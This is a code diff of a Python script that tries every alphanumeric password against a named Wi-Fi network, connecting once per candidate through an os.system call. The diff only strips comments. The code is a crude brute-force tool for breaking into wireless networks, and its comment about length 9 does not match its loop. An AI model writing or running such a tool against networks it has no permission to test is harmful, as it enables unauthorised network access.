@@ -3,18 +3,14 @@ import itertools
 
 def generate_combinations(wifi_name):
     characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
-    total_count = 0  # Initialize counter for total passwords generated
+    total_count = 0  
 
-    # Generate combinations of length 9
     with open('combinations.txt', 'w') as file:
         for length in range(9):
             for combination in itertools.product(characters, repeat=length):
                 password = ''.join(combination)
                 print(password + '\n')
-                
-                # Establish a new connection
                 create_new_connection(wifi_name, password)
-
                 total_count += 1  # Increment the counter for each password generated
 
     return total_count
@@ -53,7 +49,7 @@ def create_new_connection(wifi_name, password):
         file.write(config)
         os.system(command)
     
-    # Connect to the wifi network
+   
     connect(wifi_name, SSID)
 
 def connect(name, SSID):
